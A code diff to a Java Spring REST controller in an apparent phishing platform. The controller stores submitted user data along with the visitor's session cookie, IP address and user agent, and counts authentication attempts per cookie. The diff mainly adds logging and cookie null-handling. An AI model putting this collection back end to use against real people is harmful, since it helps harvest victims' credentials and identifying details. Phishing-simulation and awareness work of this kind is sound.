@@ -3,6 +3,7 @@ package net.v4lproik.phishingplatform.mvc.controllers;
 import net.v4lproik.phishingplatform.mvc.models.Status;
 import net.v4lproik.phishingplatform.mvc.models.UserModel;
 import net.v4lproik.phishingplatform.service.api.PhishingService;
+import org.apache.log4j.Logger;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.HttpStatus;
@@ -12,6 +13,7 @@ import org.springframework.web.util.WebUtils;
 
 import javax.servlet.http.HttpServletRequest;
 
+
 /**
  * The UserController provides different features that are implemented in REST
  * It basically allows a third party to store data in a database
@@ -19,6 +21,8 @@ import javax.servlet.http.HttpServletRequest;
 @Controller
 @RequestMapping(value = "/user")
 public class UserController {
+
+    static Logger log = Logger.getLogger(UserController.class.getName());
 
     @Value("Integer.parseInt(${phishingplatform.auth.retry})")
     private String RETRY;
@@ -43,13 +47,19 @@ public class UserController {
     @ResponseStatus(value = HttpStatus.OK)
     @ResponseBody
     public Status auth(@RequestBody UserModel cmd) {
-        //fill the user information
         try {
             cmd = this.fillUserInformation(cmd);
             final UserModel created = phishingService.create(cmd);
-            final int retry = phishingService.tryToAuthPerSession("cookie", cmd.getCookie());
-            return new Status(0, "[" + cmd.toString() + "], [{\"try\":\"" + retry + "\"}]");
+
+            int retry;
+            if(cmd.getCookie() != null) {
+                retry = phishingService.tryToAuthPerSession("cookie", (Object) cmd.getCookie());
+                return new Status(0, "[" + cmd.toString() + "], [{\"try\":\"" + retry + "\"}]");
+            }else
+                return new Status(0, "[" + cmd.toString() + "], [{\"try\":\"Error analyzing cookie.\"}]");
+
         } catch (Exception e) {
+            //e.printStackTrace();
             return new Status(0, "Auth exception " + e.toString());
         }
     }
@@ -61,7 +71,13 @@ public class UserController {
      * @return Instance of User Model
      */
     private UserModel fillUserInformation(UserModel user) {
-        user.setCookie(WebUtils.getCookie(request, COOKIE_NAME).getValue());
+        try {
+            String cookie = WebUtils.getCookie(request, COOKIE_NAME).getValue();
+            user.setCookie(cookie);
+        }catch(Exception e) {
+            log.info("Cookie trying to be read");
+            user.setCookie(null);
+        }
         user.setFromIp(request.getRemoteAddr());
         user.setUserAgent(request.getHeader("user-agent"));
         return user;
